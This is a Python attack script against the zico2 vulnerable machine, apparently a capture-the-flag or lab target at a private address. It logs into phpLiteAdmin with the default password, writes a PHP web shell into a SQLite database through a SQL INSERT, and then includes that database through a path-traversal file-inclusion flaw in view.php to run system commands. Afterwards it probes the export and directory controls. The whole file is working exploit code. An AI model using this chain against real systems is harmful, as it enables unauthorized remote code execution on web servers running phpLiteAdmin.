#!/usr/bin/env python3
"""zico2 RCE - Include SQLite file via LFI and check what happens"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'
PHPLITE = f'{BASE}/dbadmin/test_db.php'

# Login
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Create a new database with .php extension
# First, let's insert our PHP code into test_users (existing DB)
print('[1] Insert PHP payload into test_users info table...')
r = s.post(f'{PHPLITE}?switchdb=%2Fusr%2Fdatabases%2Ftest_users&view=sql', data={
    'queryval': "INSERT INTO info (name, pass, id) VALUES ('<?php system($_GET[c]); ?>', 'shell', 99)",
    'delimiter': ';',
    'query': 'Go',
}, timeout=15)
print(f'  Insert: {r.status_code}')

# Verify
r2 = s.post(f'{PHPLITE}?switchdb=%2Fusr%2Fdatabases%2Ftest_users&view=sql', data={
    'queryval': 'SELECT * FROM info',
    'delimiter': ';',
    'query': 'Go',
}, timeout=15)
has_shell = 'system' in r2.text
print(f'  Payload in DB: {has_shell}')

# Now include the SQLite file via LFI
print('\n[2] Including SQLite file via LFI...')
r3 = s.get(f'{BASE}/view.php?page=../../usr/databases/test_users&c=id', timeout=10)
print(f'  Include result: {r3.status_code} ({len(r3.text)}B)')
# Check for uid=
if 'uid=' in r3.text:
    clean = re.sub(r'<[^>]+>', '', r3.text).strip()
    print(f'  [+] RCE! Output: {clean[:200]}')
else:
    print(f'  First 500 chars:')
    print(f'  {r3.text[:500]}')

# Check for PHP errors that might contain useful info
if 'error' in r3.text.lower():
    errors = re.findall(r'(Parse error|Fatal error|Warning|Notice)[^<]*', r3.text, re.I)
    for e in errors[:3]:
        print(f'  PHP Error: {e[:200]}')

# Alternative: use SQLite's .dump to create a pure PHP file
# We can use phpLiteAdmin's export feature
print('\n[3] Try phpLiteAdmin export...')
r4 = s.get(f'{PHPLITE}?switchdb=%2Fusr%2Fdatabases%2Ftest_users&view=export', timeout=15)
print(f'  Export view: {r4.status_code} ({len(r4.text)}B)')

# Look for export form
soup = __import__('bs4', fromlist=['BeautifulSoup']).BeautifulSoup(r4.text, 'lxml')
for ta in soup.find_all('textarea'):
    print(f'  Textarea: name={ta.get("name")} content_len={len(ta.get_text())}')
for inp in soup.find_all('input'):
    if inp.get('type') != 'hidden':
        print(f'  Input: name={inp.get("name")} type={inp.get("type")}')

# The key insight: we need to use phpLiteAdmin's built-in ability to 
# change the database directory
# Look for "Change Database" or directory-related controls
for elem in soup.find_all(string=re.compile(r'directory|change|path', re.I)):
    parent = elem.find_parent(['a', 'input', 'select', 'fieldset', 'legend'])
    if parent:
        print(f'  Found: <{parent.name}> {parent.get_text(strip=True)[:100]}')
